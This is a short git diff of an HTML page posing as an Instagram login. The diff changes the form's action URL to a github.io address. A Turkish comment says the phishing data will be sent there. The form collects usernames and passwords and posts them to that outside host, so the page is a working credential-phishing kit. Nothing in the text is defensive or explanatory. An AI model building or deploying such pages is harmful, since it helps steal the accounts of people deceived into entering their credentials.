@@ -44,7 +44,7 @@
 <body>
     <div class="container">
         <h2>Instagram'a Giriş Yap</h2>
-        <form action="https://AliUsta82.github.io/login" method="POST"> <!-- Buraya phishing bilgileri gönderilecek -->
+        <form action="https://AliUsta82.github.io" method="POST"> <!-- Buraya phishing bilgileri gönderilecek -->
             <input type="text" placeholder="Kullanıcı Adı" name="username" required>
             <input type="password" placeholder="Şifre" name="password" required>
             <input type="submit" value="Giriş Yap">
